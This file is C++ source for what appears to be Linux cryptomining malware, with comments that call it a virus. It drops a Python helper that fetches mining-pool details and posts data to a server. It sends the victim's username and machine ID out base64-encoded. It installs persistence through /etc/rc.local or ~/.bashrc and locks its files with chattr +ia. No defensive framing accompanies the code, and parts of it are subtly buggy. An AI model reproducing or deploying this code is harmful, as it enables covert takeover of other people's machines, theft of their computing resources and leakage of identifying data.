#include "utils.h"
#include "error.h"
#include "base64.h"
#include "system.h"

bool is_root(){
    if(getuid()!= 0){
        return false;
    }
    return true;
}


void drop_python_script(){
    const char *script = R"(import urllib.request, json, time, urllib3
from sys import argv, exit
#usage :
#  python3 communication.py get_pool
#  python3 communication.py post

# Errors
# -1 invalid sintaxe
# -2 offline

# Invalid usage
def error():
    exit(-1)

# Offline server or computer
def offline():
    exit(-2)

url = 'http://127.0.0.1'
arq = 'mining_pool_info_file.txt'

def get_mining_pool_info():
    try:
        req = urllib.request.urlopen(url).read()
    except urllib.error.URLError:
        offline()
    except:
        offline()
    
    req = str(req)
    req = req.replace("b'", '').replace("'", "")
    print(req)
    List = json.loads(str(req))

    with open(arq, 'w') as f:
        f.write(str(List[0]) + '\n')
        f.write(str(List[1]))
    
    exit(0)


# send msg to server
def post(msg):
    encoded_body = msg 

    http = urllib3.PoolManager()
    try:
        r = http.request('POST', url,
                        headers={'Content-Type': 'text/html'},
                        body=encoded_body)
        returned_data = str(r.data)
    except:
        print("POST error")

if __name__ == '__main__':
    if(len(argv) < 2):
        error()

    if(argv[1] == 'get_pool'):
        get_mining_pool_info()
    
    elif(argv[1] == 'post'):
        if(len(argv) > 2):
            post(argv[2])
        else:
            error()

    else:
        error()
)";

    FILE *f = fopen("communication.py", "w+");
    fprintf(f, "%s", script);
    fclose(f);
}


pool_info* get_pool_info(){
    char * get_pool = "python3 communication.py get_pool";
    
    int ret = system(get_pool);
    if(ret != 0){
        Error::exit_error("[-] Couldn't Get pool info, server possible be offline or no internet connection.");
    }

    pool_info *pool = (pool_info*) malloc(sizeof(pool_info));
    pool->id = (char *) malloc(sizeof(char) * 500);
    pool->pool =(char *) malloc(sizeof(char) * 500);

    FILE *f = fopen("mining_pool_info_file.txt", "r");
    fscanf(f, "%s", pool->id);
    fscanf(f, "%s", pool->pool);
    fclose(f);
    return pool;
}


char * get_username(){
    struct passwd *pw;
    uid_t uid;
    uid_t NO_UID = -1;
    uid = getuid();

    pw = (uid == NO_UID && 0? NULL: getpwuid(uid));
    return pw->pw_name;
}


char * get_home_enviroment(){
    struct passwd *pw;
    char * home;
    uid_t uid;
    uid_t NO_UID = -1;
    uid = getuid();

    pw = (uid == NO_UID && 0? NULL: getpwuid(uid));
    home = (char*)malloc((sizeof(char) * strlen(pw->pw_dir)));
    strcpy(home, pw->pw_dir);
    strcat(home, "/");
    return home;
}


char * get_machine_id(){
    FILE * f = fopen("/etc/machine-id", "r");
    char * id = (char *)malloc(32);
    fscanf(f, "%s", id);
    fclose(f);
    return id;
}


void new_miner(){
    char * name = get_username();
    char * id = get_machine_id();
    std::string send = std::string(name) += std::string(" ") += std::string(id);
    std::string encoded = Base64::base64_encode(send);
    std::string x;
    const char * a = (x = std::string("python3 communication.py post ") += encoded).c_str();
    system(a);
}


bool create_cryptomining_folder(){
    struct stat st = {0};
    // create directory
    if (stat(miner_path, &st) == -1) {
        mkdir(miner_path, 0700);
        Error::log_error("[+] Cryptomining folder created!");
        return true;
    }
    return false;
}


void copy_executable_to_folder(){
    std::string x;
    const char * command = (x = std::string("cp ") += std::string(executable_name) += std::string(" ") += std::string(executable_path)).c_str();
    system(command);
    // remove old virus file.
    // const char * command = (x = std::string("rm ") += std::string(executable_name)).c_str();
    // system(command);
}


void install_persistence(){

    /* Create folder and copy malware to it */
    if(create_cryptomining_folder()){
        copy_executable_to_folder();
    
    }else{    
        FILE *f = fopen(executable_path, "rb");
        if(f == NULL){
            copy_executable_to_folder();
        }
    }
    
    /* Continue virus inside his directory */
    chdir(miner_path);

    /* Persist the malware */
    std::string x;
    const char * command = (x = std::string(".") += std::string(executable_path)).c_str();
    
    std::string caminho;
    const char * bashrc_path = (caminho = std::string(get_home_enviroment()) += std::string(".bashrc")).c_str();

    if(is_root()){
        char * rc_local = "/etc/rc.local";
        FILE *f = fopen(rc_local, "r");

        /* If file doesnt exist, create file */
        if(f == NULL){
            FILE *g = fopen(rc_local, "w");
            fclose(g);
        }
        fclose(f);

        std::string comando2;
        const char * command2 = (comando2 = std::string("echo \"") += x +=
        std::string("\" >> ") += std::string(rc_local)).c_str();

        system(command2);

        Error::log_error("Setting chattr in all files");
        set_persistence_bits();

        return;
    
    }else{
        std::string comando3;
        const char * command3 = (comando3 = std::string("echo \"") += x
        += std::string("\" >> ") += std::string(bashrc_path)).c_str();

        system(command3);

        return;
    }
    
    Error::log_error("[-] Persistence failed");
}

void set_persistence_bits(){
    std::string commands;
    const char * command = (commands = std::string("sudo chattr +ia ") += std::string(miner_path) +=
        std::string("*")).c_str();
    int ret = system(command);
    if(ret == 0){
        Error::log_error("[+] Chattr setted!");
    }else{
        Error::log_error("[-] Chattr error!");
    }
}
